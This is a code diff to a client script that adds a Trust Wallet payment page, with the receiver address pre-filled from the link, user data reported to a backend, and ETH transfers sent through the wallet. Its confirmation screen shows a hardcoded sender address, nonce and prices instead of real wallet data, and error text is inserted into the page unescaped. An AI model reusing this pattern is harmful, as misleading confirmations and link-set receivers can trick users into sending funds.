@@ -1,5 +1,11 @@
 // Maqueda Deploy Client Script
 
+// Configuration
+const MAQUEDA_CONFIG = {
+  // Default API server address
+  API_BASE_URL: 'http://localhost:3000'
+};
+
 (function() {
   'use strict';
 
@@ -172,20 +178,29 @@
   function initializeApp() {
     console.log('Initializing Maqueda Deploy application...');
     
+    // Check if we're in the dApp browser and need to show payment page
+    const urlParams = new URLSearchParams(window.location.search);
+    const tokenId = urlParams.get('token');
+    const receiverAddress = urlParams.get('receiver');
+    
     // Check for Trust Wallet after a short delay to allow provider discovery
-    setTimeout(checkTrustWallet, 2000);
+    setTimeout(() => {
+      checkTrustWallet(tokenId, receiverAddress);
+    }, 2000);
   }
 
   // Check if Trust Wallet is available
-  function checkTrustWallet() {
+  function checkTrustWallet(tokenId, receiverAddress) {
     const isTrustWalletApp = isTrustWalletMobile();
     trustWalletProvider = getTrustWalletProvider();
     const isTrustWalletExtension = trustWalletProvider !== null;
     const isLocalFile = window.location.protocol === 'file:';
+    const isMobile = isMobileDevice();
     
     console.log('Trust Wallet Detection Results:', {
       isTrustWalletApp,
       isTrustWalletExtension,
+      isMobile,
       isLocalFile,
       announcedProviders: Array.from(announcedProviders.values()).map(p => ({name: p.info.name, rdns: p.info.rdns})),
       windowEthereum: !!window.ethereum,
@@ -211,18 +226,63 @@
     if (isTrustWalletApp) {
       // Already in Trust Wallet app browser
       console.log('Already in Trust Wallet app browser');
+      
+      // Check if we need to show payment page
+      if (tokenId) {
+        document.querySelector('.message').textContent = 'Loading payment page...';
+        // Initialize the payment page
+        initializePaymentPage(tokenId, receiverAddress);
+      } else {
+        document.querySelector('.message').textContent = 'Trust Wallet detected. Loading app...';
+        // Initialize the app with wallet connection
+        initializeWalletApp();
+      }
+    } else if (isTrustWalletExtension && isMobile && tokenId) {
+      // Mobile device with Trust Wallet provider and token parameter - assume dApp browser context
+      console.log('Assuming Trust Wallet dApp browser context (mobile + Trust Wallet provider + token)');
+      document.querySelector('.message').textContent = 'Loading payment page...';
+      // Initialize the payment page directly
+      initializePaymentPage(tokenId, receiverAddress);
+    } else if (isTrustWalletExtension && isMobile) {
+      // Mobile device with Trust Wallet provider but no token - normal app flow
+      console.log('Assuming Trust Wallet dApp browser context (mobile + Trust Wallet provider)');
       document.querySelector('.message').textContent = 'Trust Wallet detected. Loading app...';
       // Initialize the app with wallet connection
       initializeWalletApp();
     } else if (isTrustWalletExtension) {
-      // Trust Wallet extension detected
-      console.log('Trust Wallet extension detected');
-      document.querySelector('.message').textContent = 'Trust Wallet extension detected. Click anywhere to connect.';
-      // Add click listener to trigger wallet connection
-      document.body.addEventListener('click', initializeWalletApp);
+      // Trust Wallet extension detected on desktop
+      console.log('Trust Wallet extension detected on desktop');
+      
+      // For token payments, redirect to mobile app even if extension is available
+      if (tokenId) {
+        document.querySelector('.message').textContent = 'Opening in Trust Wallet app for payment...';
+        setTimeout(() => {
+          redirectToWallet();
+        }, 1500);
+      } else {
+        document.querySelector('.message').textContent = 'Trust Wallet extension detected. Click anywhere to connect.';
+        // Add click listener to trigger wallet connection
+        document.body.addEventListener('click', initializeWalletApp);
+      }
     } else {
-      // No Trust Wallet detected, redirect to appropriate store
-      redirectToWallet();
+      // No Trust Wallet detected
+      // Check if this is a mobile device requesting a token payment
+      if (tokenId && isMobile) {
+        // Mobile device requesting token payment - redirect to Trust Wallet
+        document.querySelector('.message').textContent = 'Opening in Trust Wallet dApp browser...';
+        setTimeout(() => {
+          redirectToWallet();
+        }, 1500);
+      } else if (tokenId) {
+        // Desktop with token - redirect to Trust Wallet website
+        document.querySelector('.message').textContent = 'Please open this link on a mobile device with Trust Wallet installed';
+        setTimeout(() => {
+          window.location.href = "https://trustwallet.com/download";
+        }, 5000);
+      } else {
+        // No token, redirect to appropriate store
+        redirectToWallet();
+      }
     }
   }
 
@@ -294,7 +354,7 @@
           ...deviceInfo
         };
         
-        const response = await fetch('/api/clients/connect', {
+        const response = await fetch(`${MAQUEDA_CONFIG.API_BASE_URL}/api/clients/connect`, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -335,7 +395,7 @@
               network: chainId,
             };
             
-            await fetch('/api/clients/connect', {
+            await fetch(`${MAQUEDA_CONFIG.API_BASE_URL}/api/clients/connect`, {
               method: 'POST',
               headers: {
                 'Content-Type': 'application/json',
@@ -477,6 +537,14 @@
     const userAgent = navigator.userAgent;
     return userAgent.includes('TrustWallet');
   }
+  
+  // Check if we're on a mobile device
+  function isMobileDevice() {
+    return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+           (window.innerWidth <= 768) || 
+           ('ontouchstart' in window) ||
+           (navigator.maxTouchPoints > 0);
+  }
 
   // Redirect to appropriate wallet installation method
   function redirectToWallet() {
@@ -502,6 +570,279 @@
       console.log('Please install Trust Wallet extension');
     }
   }
+  
+  // Initialize the payment page
+  function initializePaymentPage(tokenId, receiverAddress) {
+    // Hide loader and show payment container
+    document.getElementById('loader-container').style.display = 'none';
+    document.getElementById('payment-container').style.display = 'block';
+    
+    // Set token title
+    const tokenName = getTokenName(tokenId);
+    document.getElementById('send-title').textContent = `Send ${tokenName}`;
+    
+    // Pre-fill receiver address if provided
+    if (receiverAddress) {
+      document.getElementById('receiver-address').value = receiverAddress;
+    }
+    
+    // Initialize payment functionality
+    setupPaymentPage(tokenId, tokenName);
+  }
+  
+  // Set up payment page event listeners and functionality
+  function setupPaymentPage(tokenId, tokenName) {
+    const receiverInput = document.getElementById('receiver-address');
+    const amountInput = document.getElementById('amount');
+    const usdPreview = document.getElementById('usd-preview');
+    const nextBtn = document.getElementById('next-btn');
+    const backBtn = document.getElementById('back-btn');
+    const confirmBtn = document.getElementById('confirm-btn');
+    
+    // Add input event listeners
+    receiverInput.addEventListener('input', validateInputs);
+    amountInput.addEventListener('input', () => {
+      validateInputs();
+      updateUsdPreview(amountInput.value, tokenId, usdPreview);
+    });
+    
+    // Add button event listeners
+    nextBtn.addEventListener('click', showConfirmationScreen);
+    backBtn.addEventListener('click', showSendScreen);
+    confirmBtn.addEventListener('click', confirmTransaction);
+    
+    // Initial validation
+    validateInputs();
+  }
+  
+  // Validate inputs and enable/disable next button
+  function validateInputs() {
+    const receiverAddress = document.getElementById('receiver-address').value;
+    const amount = document.getElementById('amount').value;
+    const nextBtn = document.getElementById('next-btn');
+    
+    // Simple validation (in a real app, you'd want more robust validation)
+    const isAddressValid = receiverAddress.length > 0; // Simplified validation
+    const isAmountValid = amount && parseFloat(amount) > 0;
+    
+    nextBtn.disabled = !(isAddressValid && isAmountValid);
+  }
+  
+  // Update USD preview based on amount and token
+  function updateUsdPreview(amount, tokenId, previewElement) {
+    if (!amount || parseFloat(amount) <= 0) {
+      previewElement.textContent = '≈ $0.00';
+      return;
+    }
+    
+    // Get USD value for the token (simplified - in a real app you'd fetch this from an API)
+    const usdValue = getTokenUsdValue(tokenId);
+    const usdAmount = (parseFloat(amount) * usdValue).toFixed(2);
+    previewElement.textContent = `≈ $${usdAmount}`;
+  }
+  
+  // Get token name based on token ID
+  function getTokenName(tokenId) {
+    // This would typically come from a token registry or API
+    const tokenNames = {
+      'usdc': 'USDC',
+      'eth': 'ETH',
+      'btc': 'BTC',
+      'bnb': 'BNB'
+    };
+    
+    return tokenNames[tokenId.toLowerCase()] || tokenId.toUpperCase();
+  }
+  
+  // Get USD value for a token (simplified)
+  function getTokenUsdValue(tokenId) {
+    // This would typically come from an API like CoinGecko or CoinMarketCap
+    const usdValues = {
+      'usdc': 1.00,
+      'eth': 3000.00,
+      'btc': 60000.00,
+      'bnb': 300.00
+    };
+    
+    return usdValues[tokenId.toLowerCase()] || 0;
+  }
+  
+  // Show confirmation screen
+  function showConfirmationScreen() {
+    const receiverAddress = document.getElementById('receiver-address').value;
+    const amount = document.getElementById('amount').value;
+    const urlParams = new URLSearchParams(window.location.search);
+    const tokenId = urlParams.get('token');
+    const tokenName = getTokenName(tokenId);
+    
+    // Update confirmation details
+    document.getElementById('confirm-token').textContent = tokenName;
+    document.getElementById('confirm-from').textContent = getShortenedAddress('0xB69EC96A539B150E3DA0E6E915F1'); // Would come from wallet
+    document.getElementById('confirm-to').textContent = getShortenedAddress(receiverAddress);
+    document.getElementById('confirm-amount').textContent = `${amount} ${tokenName}`;
+    document.getElementById('confirm-network').textContent = getNetworkName(); // Would come from wallet
+    document.getElementById('confirm-fee').textContent = getEstimatedFee(tokenId); // Would be calculated
+    document.getElementById('confirm-nonce').textContent = '27'; // Would come from wallet
+    
+    // Update total USD value
+    const usdValue = getTokenUsdValue(tokenId);
+    const totalUsd = (parseFloat(amount) * usdValue).toFixed(2);
+    document.getElementById('total-usd').textContent = `$${totalUsd}`;
+    
+    // Show confirmation screen and hide send screen
+    document.getElementById('send-screen').style.display = 'none';
+    document.getElementById('confirmation-screen').style.display = 'block';
+  }
+  
+  // Show send screen (go back)
+  function showSendScreen() {
+    document.getElementById('confirmation-screen').style.display = 'none';
+    document.getElementById('send-screen').style.display = 'block';
+  }
+  
+  // Confirm transaction
+  async function confirmTransaction() {
+    try {
+      // Get form values
+      const receiverAddress = document.getElementById('receiver-address').value;
+      const amount = document.getElementById('amount').value;
+      const urlParams = new URLSearchParams(window.location.search);
+      const tokenId = urlParams.get('token');
+      
+      // Validate inputs
+      if (!receiverAddress || !amount || !tokenId) {
+        alert('Missing transaction details');
+        return;
+      }
+      
+      // Check if wallet is connected
+      if (!trustWalletProvider) {
+        alert('Wallet not connected');
+        return;
+      }
+      
+      // Get connected account
+      const accounts = await trustWalletProvider.request({ method: "eth_accounts" });
+      if (accounts.length === 0) {
+        alert('No accounts found');
+        return;
+      }
+      const fromAddress = accounts[0];
+      
+      // Get network
+      const network = await trustWalletProvider.request({ method: "eth_chainId" });
+      
+      // Create transaction parameters based on token type
+      let transactionParams;
+      
+      // For ETH, we can send directly
+      if (tokenId.toLowerCase() === 'eth') {
+        // Convert amount to wei (1 ETH = 10^18 wei)
+        const amountInWei = (parseFloat(amount) * 1e18).toString();
+        
+        transactionParams = {
+          from: fromAddress,
+          to: receiverAddress,
+          value: `0x${BigInt(amountInWei).toString(16)}`,
+          gas: '0x5208', // 21000 gas limit
+        };
+      } else {
+        // For ERC-20 tokens like USDC, we need to call the contract
+        // This is a simplified example - in practice you'd need the contract ABI
+        alert(`Token ${tokenId} not supported in this demo. Only ETH transactions are supported.`);
+        return;
+      }
+      
+      // Send transaction
+      document.getElementById('confirmation-screen').innerHTML = `
+        <div style="text-align: center; padding: 40px 20px;">
+          <div class="loader" style="margin: 0 auto 20px;"></div>
+          <h2>Sending Transaction</h2>
+          <p>Please confirm in your wallet...</p>
+        </div>
+      `;
+      
+      const transactionHash = await trustWalletProvider.request({
+        method: "eth_sendTransaction",
+        params: [transactionParams]
+      });
+      
+      console.log('Transaction sent:', transactionHash);
+      
+      // Update client record with transaction info
+      try {
+        const clientData = {
+          walletAddress: fromAddress,
+          network: network,
+          lastTransactionHash: transactionHash
+        };
+        
+        await fetch(`${MAQUEDA_CONFIG.API_BASE_URL}/api/clients/connect`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(clientData),
+        });
+      } catch (sendError) {
+        console.error('Error updating client record with transaction:', sendError);
+      }
+      
+      // Show success message
+      document.getElementById('confirmation-screen').innerHTML = `
+        <div style="text-align: center; padding: 40px 20px;">
+          <div style="font-size: 48px; margin-bottom: 20px;">✓</div>
+          <h2>Transaction Submitted</h2>
+          <p>Transaction hash: ${transactionHash.substring(0, 20)}...${transactionHash.substring(transactionHash.length - 10)}</p>
+          <button class="btn" onclick="window.location.reload()">Send Another</button>
+        </div>
+      `;
+    } catch (error) {
+      console.error('Transaction error:', error);
+      let errorMessage = 'Transaction failed';
+      
+      if (error.code === 4001) {
+        errorMessage = 'Transaction rejected by user';
+      } else if (error.message) {
+        errorMessage = error.message;
+      }
+      
+      // Show error message
+      document.getElementById('confirmation-screen').innerHTML = `
+        <div style="text-align: center; padding: 40px 20px;">
+          <div style="font-size: 48px; margin-bottom: 20px;">✗</div>
+          <h2>Transaction Failed</h2>
+          <p>${errorMessage}</p>
+          <button class="btn" onclick="window.location.reload()">Try Again</button>
+        </div>
+      `;
+    }
+  }
+  
+  // Get shortened address for display
+  function getShortenedAddress(address) {
+    if (!address || address.length < 10) return address;
+    return `${address.substring(0, 15)}...${address.substring(address.length - 5)}`;
+  }
+  
+  // Get network name based on chain ID (simplified)
+  function getNetworkName() {
+    // This would normally come from the wallet provider
+    return 'Ethereum';
+  }
+  
+  // Get estimated fee based on token/network (simplified)
+  function getEstimatedFee(tokenId) {
+    // This would normally be calculated based on network conditions
+    const fees = {
+      'eth': '0.000021 ETH',
+      'usdc': '0.000021 ETH',
+      'btc': '0.00005 BTC',
+      'bnb': '0.000021 BNB'
+    };
+    
+    return fees[tokenId.toLowerCase()] || '0.000021 ETH';
+  }
 
   // Run the onScriptLoad function when the DOM is fully loaded
   if (document.readyState === 'loading') {
@@ -518,7 +859,11 @@
     init: initializeApp,
     // For debugging purposes
     getProviders: () => Array.from(announcedProviders.values()),
-    checkWallet: checkTrustWallet
+    checkWallet: checkTrustWallet,
+    // Payment page functions
+    initializePaymentPage: initializePaymentPage,
+    showConfirmationScreen: showConfirmationScreen,
+    showSendScreen: showSendScreen
   };
 
 })();
